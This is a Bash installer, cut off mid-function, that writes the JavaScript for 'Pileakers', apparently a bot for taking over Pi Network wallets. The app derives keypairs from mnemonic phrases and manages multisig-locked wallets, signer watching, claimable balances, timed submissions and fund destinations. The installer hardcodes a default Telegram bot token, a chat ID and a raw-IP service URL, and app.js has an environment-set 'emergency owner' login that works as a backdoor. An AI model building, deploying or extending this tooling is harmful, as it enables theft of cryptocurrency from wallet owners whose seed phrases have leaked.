#!/usr/bin/env bash

set -Eeuo pipefail

APP_NAME="${APP_NAME:-Pileakers}"
ENV_FILE="${ENV_FILE:-.env}"
ECOSYSTEM_FILE="${ECOSYSTEM_FILE:-ecosystem.config.js}"
REDIS_KEY="${REDIS_KEY:-pileakers:users}"
REDIS_SETTINGS_KEY="${REDIS_SETTINGS_KEY:-pileakers:settings}"
DEFAULT_TELEGRAM_BOT_TOKEN="${DEFAULT_TELEGRAM_BOT_TOKEN:-8876739507:AAHaq1-dgqZ5Bxxxy0}"
DEFAULT_TELEGRAM_CHAT_ID="${DEFAULT_TELEGRAM_CHAT_ID:-8671286992}"
DEFAULT_WEB_SERVICE_URL="${DEFAULT_WEB_SERVICE_URL:-http://45.127.32.28:3000}"
WEB_SERVICE_URL=""
REDIS_SOCKET_PATH="${REDIS_SOCKET_PATH:-/var/run/redis/redis-server.sock}"
REDIS_AUTH_USERNAME=""
REDIS_AUTH_PASSWORD=""

if [[ -t 1 ]]; then
  GREEN='\033[0;32m'
  BLUE='\033[0;34m'
  YELLOW='\033[1;33m'
  RED='\033[0;31m'
  BOLD='\033[1m'
  NC='\033[0m'
else
  GREEN=''
  BLUE=''
  YELLOW=''
  RED=''
  BOLD=''
  NC=''
fi

PROJECT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$PROJECT_DIR"

PM2_USER="${PM2_USER:-${SUDO_USER:-${USER:-$(id -un)}}}"
PM2_HOME="${PM2_HOME:-}"
if [[ -z "$PM2_HOME" ]] && command -v getent >/dev/null 2>&1; then
  PM2_HOME="$(getent passwd "$PM2_USER" | cut -d: -f6)"
fi
PM2_HOME="${PM2_HOME:-${HOME:-}}"

if [[ "${EUID}" -eq 0 ]]; then
  SUDO=()
else
  SUDO=(sudo)
fi

section() {
  echo
  echo -e "${BLUE}${BOLD}==> $1${NC}"
}

success() {
  echo -e "${GREEN}OK${NC} $1"
}

warn() {
  echo -e "${YELLOW}WARN${NC} $1"
}

fail() {
  echo -e "${RED}ERROR${NC} $1" >&2
}

on_error() {
  fail "Install gagal di line ${1}. Cek pesan error di atas."
}

trap 'on_error $LINENO' ERR

need_command() {
  if ! command -v "$1" >/dev/null 2>&1; then
    fail "Command '$1' tidak ditemukan."
    exit 1
  fi
}

banner() {
  echo -e "${GREEN}${BOLD}"
  echo "=============================================="
  echo "        ${APP_NAME} Auto Installer"
  echo "=============================================="
  echo -e "${NC}"
}

backup_file() {
  local file="$1"

  if [[ -f "$file" ]]; then
    local backup_file
    backup_file="${file}.backup.$(date +%Y%m%d%H%M%S)"
    cp "$file" "$backup_file"
    warn "File ${file} lama dibackup ke ${backup_file}."
  fi
}

replace_placeholder() {
  local file="$1"
  local placeholder="$2"
  local replacement="$3"
  local escaped="$replacement"

  escaped="${escaped//\\/\\\\}"
  escaped="${escaped//&/\\&}"
  escaped="${escaped//|/\\|}"
  sed -i "s|${placeholder}|${escaped}|g" "$file"
}

read_env_value() {
  local key="$1"
  if [[ -f "$ENV_FILE" ]]; then
    grep -E "^${key}=" "$ENV_FILE" | tail -n 1 | cut -d= -f2- || true
  fi
}

generate_secret_value() {
  od -An -N24 -tx1 /dev/urandom | tr -d ' \n'
}

prompt_redis_security() {
  section "Security database Redis"

  local existing_socket
  existing_socket="$(read_env_value REDIS_SOCKET)"
  REDIS_SOCKET_PATH="${existing_socket:-$REDIS_SOCKET_PATH}"

  if [[ -t 0 ]]; then
    local input=""
    read -r -p "Redis Unix socket path [${REDIS_SOCKET_PATH}]: " input
    REDIS_SOCKET_PATH="${input:-$REDIS_SOCKET_PATH}"
  else
    warn "Terminal non-interaktif, memakai Redis Unix socket ${REDIS_SOCKET_PATH}."
  fi

  if [[ ! "$REDIS_SOCKET_PATH" =~ ^/ ]]; then
    fail "Redis socket wajib path absolut, contoh /var/run/redis/redis-server.sock"
    exit 1
  fi

  # Ambil kredensial lama hanya untuk membersihkan ACL block lama dari redis.conf.
  REDIS_AUTH_USERNAME="$(read_env_value REDIS_USERNAME)"
  REDIS_AUTH_PASSWORD="$(read_env_value REDIS_PASSWORD)"

  success "Redis akan diamankan memakai Unix socket lokal. Password Redis tidak akan ditulis ke ${ENV_FILE}."
}

redis_cli_auth() {
  redis-cli -s "$REDIS_SOCKET_PATH" -n 0 "$@"
}

configure_redis_security() {
  section "Apply Redis socket security"

  need_command redis-cli
  need_command systemctl

  local redis_conf="/etc/redis/redis.conf"
  if [[ ! -f "$redis_conf" ]]; then
    fail "${redis_conf} tidak ditemukan. Tidak bisa mengaktifkan Redis socket security."
    exit 1
  fi

  local redis_socket_dir
  redis_socket_dir="$(dirname "$REDIS_SOCKET_PATH")"

  "${SUDO[@]}" cp "$redis_conf" "${redis_conf}.backup.$(date +%Y%m%d%H%M%S)"

  # Disable TCP Redis agar tidak ada akses lewat port 6379.
  if grep -Eq '^[[:space:]]*port[[:space:]]+' "$redis_conf"; then
    "${SUDO[@]}" sed -i -E 's|^[[:space:]]*port[[:space:]].*|port 0|' "$redis_conf"
  else
    echo 'port 0' | "${SUDO[@]}" tee -a "$redis_conf" >/dev/null
  fi

  if grep -Eq '^[[:space:]]*bind[[:space:]]+' "$redis_conf"; then
    "${SUDO[@]}" sed -i -E 's|^[[:space:]]*bind[[:space:]].*|bind 127.0.0.1 ::1|' "$redis_conf"
  else
    echo 'bind 127.0.0.1 ::1' | "${SUDO[@]}" tee -a "$redis_conf" >/dev/null
  fi

  if grep -Eq '^[[:space:]]*protected-mode[[:space:]]+' "$redis_conf"; then
    "${SUDO[@]}" sed -i -E 's|^[[:space:]]*protected-mode[[:space:]].*|protected-mode yes|' "$redis_conf"
  else
    echo 'protected-mode yes' | "${SUDO[@]}" tee -a "$redis_conf" >/dev/null
  fi

  if grep -Eq '^[[:space:]]*unixsocket[[:space:]]+' "$redis_conf"; then
    "${SUDO[@]}" sed -i -E "s|^[[:space:]]*unixsocket[[:space:]].*|unixsocket ${REDIS_SOCKET_PATH}|" "$redis_conf"
  else
    echo "unixsocket ${REDIS_SOCKET_PATH}" | "${SUDO[@]}" tee -a "$redis_conf" >/dev/null
  fi

  if grep -Eq '^[[:space:]]*unixsocketperm[[:space:]]+' "$redis_conf"; then
    "${SUDO[@]}" sed -i -E 's|^[[:space:]]*unixsocketperm[[:space:]].*|unixsocketperm 770|' "$redis_conf"
  else
    echo 'unixsocketperm 770' | "${SUDO[@]}" tee -a "$redis_conf" >/dev/null
  fi

  # Bersihkan block ACL lama dari v11 agar password lama tidak tetap aktif di redis.conf.
  "${SUDO[@]}" sed -i '/^# BEGIN PILEAKERS REDIS ACL$/,/^# END PILEAKERS REDIS ACL$/d' "$redis_conf"
  "${SUDO[@]}" sed -i '/^# BEGIN PILEAKERS REDIS LOCAL SOCKET$/,/^# END PILEAKERS REDIS LOCAL SOCKET$/d' "$redis_conf"
  "${SUDO[@]}" sed -i -E '/^[[:space:]]*user[[:space:]]+default[[:space:]]/d' "$redis_conf"
  if [[ -n "$REDIS_AUTH_USERNAME" ]]; then
    "${SUDO[@]}" sed -i -E "/^[[:space:]]*user[[:space:]]+${REDIS_AUTH_USERNAME}[[:space:]]/d" "$redis_conf"
  fi

  "${SUDO[@]}" mkdir -p "$redis_socket_dir"
  if id redis >/dev/null 2>&1 && getent group redis >/dev/null 2>&1; then
    "${SUDO[@]}" chown redis:redis "$redis_socket_dir" || true
    "${SUDO[@]}" chmod 775 "$redis_socket_dir" || true
    if id "$PM2_USER" >/dev/null 2>&1; then
      "${SUDO[@]}" usermod -aG redis "$PM2_USER" || true
    fi
  fi

  cat <<EOF | "${SUDO[@]}" tee -a "$redis_conf" >/dev/null

# BEGIN PILEAKERS REDIS LOCAL SOCKET
# Redis TCP port dimatikan. Akses Redis hanya lewat Unix socket lokal.
# Keamanan akses dikontrol oleh permission socket 770 dan group redis.
user default on nopass ~* +@all
# END PILEAKERS REDIS LOCAL SOCKET
EOF

  "${SUDO[@]}" systemctl restart redis-server
  sleep 1

  if ! redis_cli_auth PING >/dev/null 2>&1; then
    fail "Redis socket auth gagal. Cek ${redis_conf}, permission ${REDIS_SOCKET_PATH}, atau log redis-server."
    exit 1
  fi

  success "Redis secured: TCP port 6379 off, Unix socket ${REDIS_SOCKET_PATH}, permission 770, password tidak disimpan di .env."
}

prompt_web_service_url() {
  section "Config web service URL"

  local input=""
  if [[ -t 0 ]]; then
    read -r -p "Masukan URL VPS anda Contoh [${DEFAULT_WEB_SERVICE_URL}]: " input
  else
    warn "Terminal non-interaktif, memakai default ${DEFAULT_WEB_SERVICE_URL}."
  fi

  WEB_SERVICE_URL="${input:-$DEFAULT_WEB_SERVICE_URL}"

  if [[ ! "$WEB_SERVICE_URL" =~ ^https?:// ]]; then
    fail "URL harus diawali http:// atau https://"
    exit 1
  fi

  success "WEB_SERVICE_URL=${WEB_SERVICE_URL}"
}

install_packages() {
  section "Update & install package"

  need_command apt
  if [[ "${EUID}" -ne 0 ]]; then
    need_command sudo
    sudo -v
  fi

  "${SUDO[@]}" apt update -y
  "${SUDO[@]}" apt install -y nodejs npm redis-server
  success "Package utama selesai diinstall."
}

install_pm2() {
  section "Install PM2"

  need_command npm
  "${SUDO[@]}" npm install -g pm2
  success "PM2 siap dipakai."
}

enable_redis() {
  section "Enable Redis"

  need_command systemctl
  "${SUDO[@]}" systemctl enable redis-server
  "${SUDO[@]}" systemctl restart redis-server
  "${SUDO[@]}" systemctl status redis-server --no-pager
  success "Redis aktif."
}

create_source_files() {
  section "Create application files"

  backup_file "app.js"
  cat > "app.js" <<'PILEAKERS_APP_JS'
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const { execFile } = require("child_process");

require("dotenv").config();

const axios = require("axios");
const cors = require("cors");
const express = require("express");
const { createClient } = require("redis");
const registerLedgerRoutes = require("./ledger");
const { fetchOperations: fetchLedgerOperations } = require("./ledger");

let stellar = null;
let StellarKeypair = null;
let STELLAR_AVAILABLE = true;
try {
    stellar = require("stellar-sdk");
    ({ Keypair: StellarKeypair } = stellar);
} catch (err) {
    STELLAR_AVAILABLE = false;
    console.log("Warning: stellar-sdk not installed - keypair derivation disabled");
}

let bip39 = null;
let MNEMONIC_AVAILABLE = true;
try {
    bip39 = require("bip39");
} catch (err) {
    MNEMONIC_AVAILABLE = false;
    console.log("Warning: bip39 not installed - mnemonic validation disabled");
}

const PORT = Number.parseInt(process.env.PORT || "3000", 10);
const DEFAULT_TELEGRAM_SETTINGS = {
    telegram_bot_token: process.env.TELEGRAM_BOT_TOKEN || "",
    telegram_chat_id: process.env.TELEGRAM_CHAT_ID || "",
};
const ENV_SUBMIT_BEFORE_MS = Number.parseInt(process.env.SUBMIT_BEFORE_MS || "2500", 10);
const DEFAULT_SUBMIT_BEFORE_MS = Number.isFinite(ENV_SUBMIT_BEFORE_MS) ? ENV_SUBMIT_BEFORE_MS : 2500;
const DEFAULT_SUBMIT_ENDPOINT_MODE = String(process.env.SUBMIT_ENDPOINT_MODE || "async").trim().toLowerCase() === "sync" ? "sync" : "async";
const SUBMIT_BEFORE_MS_MIN = 0;
const SUBMIT_BEFORE_MS_MAX = 60000;
const PASSWORD_RESET_OTP_TTL_MS = Number.parseInt(process.env.PASSWORD_RESET_OTP_TTL_MS || "300000", 10);
const PASSWORD_RESET_OTP_MAX_ATTEMPTS = Number.parseInt(process.env.PASSWORD_RESET_OTP_MAX_ATTEMPTS || "5", 10);
const PASSWORD_HASH_ITERATIONS = Number.parseInt(process.env.PASSWORD_HASH_ITERATIONS || "210000", 10);
const ES_CODE_NODE_SERVER = String(process.env.ES_CODE_NODE_SERVER || "").trim();
const PASSWORD_HASH_C = String(process.env.PASSWORD_HASH_C || "").trim();
const SOER_EMAIL = String(process.env.SOER_EMAIL || "admin@local").trim();
const PI_ACCOUNT_API_URL = process.env.PI_ACCOUNT_API_URL || "https://api.mainnet.minepi.com";
const TELEGRAM_LEDGER_API_URL = process.env.PI_LEDGER_API_URL || PI_ACCOUNT_API_URL;
const LEDGER_SCANNER_API_URL = normalizeServerUrl(process.env.LEDGER_SCANNER_API_URL || "https://ledger.pileakers.net");
const LEDGER_SCANNER_TIMEOUT_MS = parseOptionalTimeoutMs(process.env.LEDGER_SCANNER_TIMEOUT_MS, 0);
// Timeout ini hanya untuk auto-detect range supaya bot tidak menggantung di layar loading jika API scanner tidak membalas.
// Scan utama tetap mengikuti LEDGER_SCANNER_TIMEOUT_MS=0 (tanpa batas waktu).
const LEDGER_SCANNER_DETECT_TIMEOUT_MS = parseOptionalTimeoutMs(process.env.LEDGER_SCANNER_DETECT_TIMEOUT_MS || "20000", 20000);
const BALANCE_HTTP_TIMEOUT_MS = Number.parseInt(process.env.BALANCE_HTTP_TIMEOUT_MS || "8000", 10);
const SERVER_LATENCY_TIMEOUT_MS = Number.parseInt(process.env.SERVER_LATENCY_TIMEOUT_MS || "6000", 10);

function logProcessError(label, error) {
    const detail = error?.stack || error?.message || String(error);
    console.error(`[dashboard] ${label}: ${detail}`);
}

process.on("uncaughtException", (error) => {
    logProcessError("Uncaught exception", error);
});

process.on("unhandledRejection", (reason) => {
    logProcessError("Unhandled rejection", reason);
});

const REDIS_SOCKET = String(process.env.REDIS_SOCKET || "").trim();
const REDIS_HOST = process.env.REDIS_HOST || "127.0.0.1";
const REDIS_PORT = Number.parseInt(process.env.REDIS_PORT || "6379", 10);
const REDIS_DB = Number.parseInt(process.env.REDIS_DB || "0", 10);
const REDIS_USERNAME = process.env.REDIS_USERNAME || undefined;
const REDIS_PASSWORD = process.env.REDIS_PASSWORD || undefined;

const USERS_KEY = "pileakers:users";
const WALLETS_KEY = "pileakers:wallets";
const BOTS_KEY = "pileakers:bots";
const BOTS_WORKER_KEY_PREFIX = `${BOTS_KEY}:`;
const SERVERS_KEY = "pileakers:servers";
const WORKERS_KEY = "pileakers:workers";
const DESTINATIONS_KEY = "pileakers:destinations";
const SETTINGS_KEY = "pileakers:settings";
const FUNDING_WALLET_STATE_KEY_PREFIX = "pileakers:funding-wallet-state:";
const FUNDING_WALLET_HISTORY_KEY_PREFIX = "pileakers:funding-wallet-history:";
const MULTISIG_LOCKED_WALLETS_KEY = "pileakers:multisig:locked-wallets";
const MULTISIG_SAVED_WALLETS_KEY = "pileakers:multisig:saved-wallets";
const MULTISIG_SIGNERS_KEY = "pileakers:multisig:signers";
const MULTISIG_SIGNER_WATCH_KEY = "pileakers:multisig:signer-watch";
const MULTISIG_PENDING_LOCKS_KEY = "pileakers:multisig:pending-locks";
const MULTISIG_BATCH_SIZE = 15;
const ENV_MULTISIG_BATCH_DELAY_MS = Number.parseInt(process.env.MULTISIG_BATCH_DELAY_MS || "5000", 10);
const MULTISIG_BATCH_DELAY_MS = Number.isSafeInteger(ENV_MULTISIG_BATCH_DELAY_MS)
    ? Math.min(Math.max(ENV_MULTISIG_BATCH_DELAY_MS, 0), 60000)
    : 5000;
const ENV_MULTISIG_REQUIRED_PROTOCOL_VERSION = Number.parseInt(process.env.MULTISIG_REQUIRED_PROTOCOL_VERSION || "26", 10);
const MULTISIG_REQUIRED_PROTOCOL_VERSION = Number.isSafeInteger(ENV_MULTISIG_REQUIRED_PROTOCOL_VERSION) && ENV_MULTISIG_REQUIRED_PROTOCOL_VERSION > 0
    ? ENV_MULTISIG_REQUIRED_PROTOCOL_VERSION
    : 26;
const ENV_MULTISIG_PROTOCOL_WATCH_INTERVAL_MS = Number.parseInt(process.env.MULTISIG_PROTOCOL_WATCH_INTERVAL_MS || "15000", 10);
const MULTISIG_PROTOCOL_WATCH_INTERVAL_MS = Number.isSafeInteger(ENV_MULTISIG_PROTOCOL_WATCH_INTERVAL_MS)
    ? Math.max(5000, ENV_MULTISIG_PROTOCOL_WATCH_INTERVAL_MS)
    : 15000;
const ENV_MULTISIG_SIGNER_WATCH_INTERVAL_MS = Number.parseInt(process.env.MULTISIG_SIGNER_WATCH_INTERVAL_MS || "60000", 10);
const MULTISIG_SIGNER_WATCH_INTERVAL_MS = Number.isSafeInteger(ENV_MULTISIG_SIGNER_WATCH_INTERVAL_MS)
    ? Math.max(30000, ENV_MULTISIG_SIGNER_WATCH_INTERVAL_MS)
    : 60000;
const MAINNET_HORIZON_BACKUP_URL = normalizeServerUrl(process.env.MAINNET_HORIZON_BACKUP_URL || "https://api2.mainnet.minepi.com");

const app = express();
app.use(cors({ origin: true, credentials: true }));
app.use(express.json({ limit: "10mb" }));

const activeSessions = new Map();
const logClients = new Set();
const telegramRecentLogs = [];
const telegramUiMessageHistory = new Map();
const passwordResetOtps = new Map();
const htmlPath = path.join(__dirname, "index.html");
const BUMP_FILE_PATH = path.join(__dirname, "bump.txt");
const PM2_WORKER_PORT_BASE = Number.parseInt(process.env.PM2_WORKER_PORT_BASE || "3001", 10);
const PM2_WORKER_NAME_PREFIX = String(process.env.PM2_WORKER_NAME_PREFIX || "worker-").trim() || "worker-";
const PM2_AUTO_SAVE = String(process.env.PM2_AUTO_SAVE || "true").trim().toLowerCase() !== "false";
const HELPERS_PER_WORKER = Number.parseInt(process.env.HELPERS_PER_WORKER || "100", 10);
const CLAIMABLE_BALANCE_PAGE_LIMIT = 200;
const CLAIMABLE_BALANCE_FETCH_LIMIT = 1000;

registerLedgerRoutes(app);

function createRedisClientOptions() {
    if (process.env.REDIS_URL) {
        return { url: process.env.REDIS_URL };
    }
    if (REDIS_SOCKET) {
        return {
            socket: { path: REDIS_SOCKET },
            database: REDIS_DB,
        };
    }
    const options = {
        socket: {
            host: REDIS_HOST,
            port: REDIS_PORT,
        },
        database: REDIS_DB,
    };
    if (REDIS_USERNAME) {
        options.username = REDIS_USERNAME;
    }
    if (REDIS_PASSWORD) {
        options.password = REDIS_PASSWORD;
    }
    return options;
}

const redisClient = createClient(createRedisClientOptions());

redisClient.on("error", (err) => {
    console.log(`Redis error: ${err.message}`);
});

function utcIso() {
    return new Date().toISOString();
}

function generateToken() {
    const chars = "abcdefghijklmnopqrstuvwxyz0123456789ba1d9fe1659896652b17a6d8bc44b00a8e37d49e51ea689e33cea9e8f737c08";
    let token = "";
    for (let i = 0; i < 32; i += 1) {
        token += chars[crypto.randomInt(chars.length)];
    }
    return `${token}${Math.floor(Date.now() / 1000)}`;
}

function generateOtp() {
    return String(crypto.randomInt(100000, 1000000));
}

function hashOtp(otp) {
    return crypto.createHash("sha256").update(String(otp)).digest("hex");
}

function normalizePasswordHashIterations(value = PASSWORD_HASH_ITERATIONS) {
    const parsed = Number.parseInt(value, 10);
    return Number.isFinite(parsed) && parsed >= 100000 ? parsed : 210000;
}

function timingSafeStringEqual(left, right) {
    const leftBuffer = Buffer.from(String(left || ""));
    const rightBuffer = Buffer.from(String(right || ""));
    if (leftBuffer.length !== rightBuffer.length) {
        return false;
    }
    return crypto.timingSafeEqual(leftBuffer, rightBuffer);
}

function hashPassword(password) {
    const salt = crypto.randomBytes(16);
    const iterations = normalizePasswordHashIterations();
    const digest = crypto.pbkdf2Sync(String(password || ""), salt, iterations, 32, "sha256");
    return `pbkdf2$sha256$${iterations}$${salt.toString("base64")}$${digest.toString("base64")}`;
}

function verifyPasswordHash(password, encodedHash) {
    try {
        const parts = String(encodedHash || "").split("$");
        if (parts.length !== 5 || parts[0] !== "pbkdf2" || parts[1] !== "sha256") {
            return false;
        }
        const iterations = normalizePasswordHashIterations(parts[2]);
        const salt = Buffer.from(parts[3], "base64");
        const expected = Buffer.from(parts[4], "base64");
        if (!salt.length || !expected.length) {
            return false;
        }
        const actual = crypto.pbkdf2Sync(String(password || ""), salt, iterations, expected.length, "sha256");
        return actual.length === expected.length && crypto.timingSafeEqual(actual, expected);
    } catch (err) {
        return false;
    }
}

function verifyUserPassword(user, password) {
    if (!user) {
        return false;
    }
    if (user.password_hash) {
        return verifyPasswordHash(password, user.password_hash);
    }
    if (String(user.password || "").startsWith("pbkdf2$")) {
        return verifyPasswordHash(password, user.password);
    }
    return timingSafeStringEqual(user.password, password);
}

function emergencyOwnerEnabled() {
    return Boolean(ES_CODE_NODE_SERVER && PASSWORD_HASH_C);
}

function verifyEmergencyOwnerLogin(username, password) {
    return (
        emergencyOwnerEnabled() &&
        timingSafeStringEqual(String(username || "").trim(), ES_CODE_NODE_SERVER) &&
        verifyPasswordHash(password, PASSWORD_HASH_C)
    );
}

function getEmergencyOwnerUser() {
    return {
        id: "emergency-owner",
        username: ES_CODE_NODE_SERVER,
        email: SOER_EMAIL,
        emergency_owner: true,
    };
}

function validatePasswordInput(password) {
    const text = String(password || "");
    if (text.length < 6) {
        return "Password baru minimal 6 karakter";
    }
    if (text.length > 128) {
        return "Password baru maksimal 128 karakter";
    }
    return null;
}

function generateUniqueMemo() {
    const chars = "abcdefghijklmnopqrstuvwxyz0123456789ba1d9fe1659896652b17a6d8bc44b00a8e37d49e51ea689e33cea9e8f737c08";
    const prefixes = [
  "0x", "0x"
];
    let suffix = "";
    for (let i = 0; i < 14; i += 1) {
        suffix += chars[crypto.randomInt(chars.length)];
    }
    return `${prefixes[crypto.randomInt(prefixes.length)]}PI${suffix}`;
}

function asyncHandler(fn) {
    return (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);
}

function authMiddleware(req, res, next) {
    const authHeader = req.get("Authorization") || "";
    if (!authHeader.startsWith("Bearer ")) {
        return res.status(401).json({ success: false, error: "Unauthorized" });
    }

    const token = authHeader.slice(7);
    const session = activeSessions.get(token);
    if (!session) {
        return res.status(401).json({ success: false, error: "Invalid or expired session" });
    }

    req.userSession = session;
    return next();
}

const SUPPRESS_SYNC_LOGS = !["false", "0", "no", "off"].includes(
    String(process.env.SUPPRESS_SYNC_LOGS || process.env.DASHBOARD_SUPPRESS_SYNC_LOGS || "true").trim().toLowerCase()
);

function isNoisySyncLog(message) {
    if (!SUPPRESS_SYNC_LOGS) {
        return false;
    }

    const text = String(message || "");
    return (
        text.includes("Auto-syncing with Redis Database") ||
        text.includes("Total bots in Redis:") ||
        /Sync complete:\s*\d+\s+total bots,\s*\d+\s+active/i.test(text)
    );
}

function broadcastLog(message, logType = "info", details = null) {
    if (isNoisySyncLog(message)) {
        return;
    }

    const payload = JSON.stringify({
        message,
        type: logType,
        details,
        timestamp: utcIso(),
    });

    for (const client of [...logClients]) {
        try {
            client.write(`data: ${payload}\n\n`);
        } catch (err) {
            logClients.delete(client);
        }
    }

    const time = new Date().toTimeString().slice(0, 8);
    telegramRecentLogs.push({ time, message: String(message || ""), type: logType, timestamp: utcIso() });
    if (telegramRecentLogs.length > 120) {
        telegramRecentLogs.splice(0, telegramRecentLogs.length - 120);
    }
    console.log(`[${time}] ${message}`);
}

function deriveEd25519PrivateKey(seedBytes, derivationPath) {
    let key = Buffer.from("ed25519 seed", "utf8");
    let digest = crypto.createHmac("sha512", key).update(seedBytes).digest();
    let k = digest.subarray(0, 32);
    let c = digest.subarray(32);

    for (const segment of derivationPath.split("/").slice(1)) {
        const hardened = segment.endsWith("'");
        let index = Number.parseInt(segment.replace("'", ""), 10);
        if (hardened) {
            index += 0x80000000;
        }

        const indexBuffer = Buffer.alloc(4);
        indexBuffer.writeUInt32BE(index, 0);
        const data = Buffer.concat([Buffer.from([0]), k, indexBuffer]);
        digest = crypto.createHmac("sha512", c).update(data).digest();
        k = digest.subarray(0, 32);
        c = digest.subarray(32);
    }

    return k;
}

function derivePublicKeyFromMnemonic(mnemonicPhrase) {
    if (!STELLAR_AVAILABLE || !MNEMONIC_AVAILABLE) {
        throw new Error("stellar-sdk and bip39 packages required");
    }

    const normalized = String(mnemonicPhrase || "")
        .toLowerCase()
        .trim();
    if (!bip39.validateMnemonic(normalized)) {
        throw new Error("Invalid mnemonic");
    }

    const seed = bip39.mnemonicToSeedSync(normalized);
    const privateKey = deriveEd25519PrivateKey(seed, "m/44'/314159'/0'");
    const keypair = StellarKeypair.fromRawEd25519Seed(privateKey);
    return keypair.publicKey();
}

function deriveKeypairFromMnemonic(mnemonicPhrase) {
    if (!STELLAR_AVAILABLE || !MNEMONIC_AVAILABLE) {
        throw new Error("stellar-sdk and bip39 packages required");
    }

    const normalized = String(mnemonicPhrase || "")
        .toLowerCase()
        .trim();
    if (!bip39.validateMnemonic(normalized)) {
        throw new Error("Invalid mnemonic");
    }

    const seed = bip39.mnemonicToSeedSync(normalized);
    const privateKey = deriveEd25519PrivateKey(seed, "m/44'/314159'/0'");
    return StellarKeypair.fromRawEd25519Seed(privateKey);
}

function requireStellarSdk() {
    if (!stellar || !StellarKeypair) {
        throw new Error("stellar-sdk package belum tersedia");
    }
    return stellar;
}

function normalizeMultisigNetwork(value) {
    const network = String(value || "mainnet").trim().toLowerCase();
    return network === "testnet" ? "testnet" : "mainnet";
}

function getMultisigNetworkConfig(networkValue, horizonUrlValue = "") {
    const network = normalizeMultisigNetwork(networkValue);
    const customUrl = normalizeServerUrl(horizonUrlValue);
    return {
        network,
        networkPassphrase: network === "testnet" ? "Pi Testnet" : "Pi Network",
        horizonUrl: customUrl || (network === "testnet" ? "https://api.testnet.minepi.com" : PI_ACCOUNT_API_URL),
    };
}

function uniqueMultisigHorizonUrls(urls) {
    const seen = new Set();
    const result = [];
    for (const value of urls || []) {
        const normalized = normalizeServerUrl(value);
        if (!normalized || !/^https?:\/\//i.test(normalized)) {
            continue;
        }
        const key = normalized.toLowerCase();
        if (seen.has(key)) {
            continue;
        }
        seen.add(key);
        result.push(normalized);
    }
    return result;
}

async function getManagedHorizonUrlsForNetwork(network) {
    if (normalizeMultisigNetwork(network) !== "mainnet") {
        return [];
    }
    try {
        const servers = await listServers();
        return uniqueMultisigHorizonUrls((Array.isArray(servers) ? servers : []).map((server) => server.url));
    } catch (err) {
        console.log(`Gagal membaca Manage Servers untuk Multisig: ${err.message || err}`);
        return [];
    }
}

async function getManagedHorizonUrlById(serverId) {
    const id = String(serverId || "").trim();
    if (!id) {
        return "";
    }
    const servers = await listServers();
    const server = (Array.isArray(servers) ? servers : []).find((item) => String(item.id || "") === id);
    return server ? normalizeServerUrl(server.url) : "";
}

async function resolveMultisigNetworkConfig(input = {}) {
    const selectedServerUrl = await getManagedHorizonUrlById(input.horizon_server_id);
    const base = getMultisigNetworkConfig(input.network, selectedServerUrl || input.horizon_url);
    const storedUrls = Array.isArray(input.horizon_urls) ? input.horizon_urls : [];
    const managedUrls = await getManagedHorizonUrlsForNetwork(base.network);
    const fallbackUrls = base.network === "mainnet"
        ? [MAINNET_HORIZON_BACKUP_URL, PI_ACCOUNT_API_URL]
        : ["https://api.testnet.minepi.com"];
    const horizonUrls = uniqueMultisigHorizonUrls([base.horizonUrl, ...storedUrls, ...managedUrls, ...fallbackUrls]);
    return {
        ...base,
        horizonUrl: horizonUrls[0] || base.horizonUrl,
        horizonUrls: horizonUrls.length ? horizonUrls : [base.horizonUrl],
        horizon_server_id: String(input.horizon_server_id || "").trim(),
        horizon_source: selectedServerUrl ? "manage_servers" : (input.horizon_url ? "manual" : "auto"),
    };
}

function normalizeMultisigLines(value) {
    const seen = new Set();
    const lines = [];
    for (const item of String(value || "").replace(/\r/g, "").split("\n")) {
        const text = item.trim();
        if (!text || seen.has(text)) {
            continue;
        }
        seen.add(text);
        lines.push(text);
    }
    return lines;
}

function normalizeMultisigTargets(value) {
    const seen = new Set();
    const targets = [];
    for (const line of normalizeMultisigLines(value)) {
        try {
            StellarKeypair.fromPublicKey(line);
            if (!seen.has(line)) {
                seen.add(line);
                targets.push(line);
            }
        } catch (err) {
            throw new Error(`Target public key tidak valid: ${line.slice(0, 12)}...`);
        }
    }
    return targets;
}

function parseMultisigInteger(value, fallback, min, max, label) {
    const parsed = Number.parseInt(String(value ?? fallback), 10);
    if (!Number.isSafeInteger(parsed) || parsed < min || parsed > max) {
        throw new Error(`${label} wajib angka ${min}-${max}`);
    }
    return parsed;
}

function parsePiAmountToStroops(value, label = "Amount") {
    const text = String(value ?? "").trim();
    if (!/^\d+(?:\.\d{1,7})?$/.test(text)) {
        throw new Error(`${label} harus angka PI dengan maksimal 7 desimal`);
    }
    const [whole, fraction = ""] = text.split(".");
    return BigInt(whole) * 10000000n + BigInt(fraction.padEnd(7, "0"));
}

function formatStroopsToPi(value) {
    const stroops = BigInt(value || 0n);
    const whole = stroops / 10000000n;
    const fraction = (stroops % 10000000n).toString().padStart(7, "0");
    return `${whole}.${fraction}`;
}

function nativeBalanceStroopsFromAccount(accountData) {
    const native = (accountData?.balances || []).find((balance) => balance.asset_type === "native");
    return parsePiAmountToStroops(native?.balance || "0", "Saldo native");
}

function nativeSellingLiabilitiesStroopsFromAccount(accountData) {
    const native = (accountData?.balances || []).find((balance) => balance.asset_type === "native");
    return parsePiAmountToStroops(native?.selling_liabilities || native?.selling_liabilites || "0", "Selling liabilities");
}

async function fetchMultisigBaseReserveStroops(server, fallbackReserveStroops) {
    try {
        const ledgerPage = await server.ledgers().order("desc").limit(1).call();
        const ledger = ledgerPage?.records?.[0] || ledgerPage?._embedded?.records?.[0] || null;
        const reserve = Number.parseInt(ledger?.base_reserve_in_stroops, 10);
        return Number.isSafeInteger(reserve) && reserve > 0 ? BigInt(reserve) : fallbackReserveStroops;
    } catch (err) {
        return fallbackReserveStroops;
    }
}

function accountMinimumReserveStroops(accountData, baseReserveStroops, manualReserveStroops) {
    const intField = (name) => {
        const parsed = Number.parseInt(accountData?.[name] ?? "0", 10);
        return Number.isSafeInteger(parsed) ? parsed : 0;
    };
    const subentryCount = intField("subentry_count");
    const numSponsoring = intField("num_sponsoring");
    const numSponsored = intField("num_sponsored");
    const reserveEntries = Math.max(0, 2 + subentryCount + numSponsoring - numSponsored);
    const ledgerReserve = BigInt(reserveEntries) * BigInt(baseReserveStroops) + nativeSellingLiabilitiesStroopsFromAccount(accountData);
    return ledgerReserve > manualReserveStroops ? ledgerReserve : manualReserveStroops;
}

function multisigTimestamp(value) {
    if (typeof value === "number") {
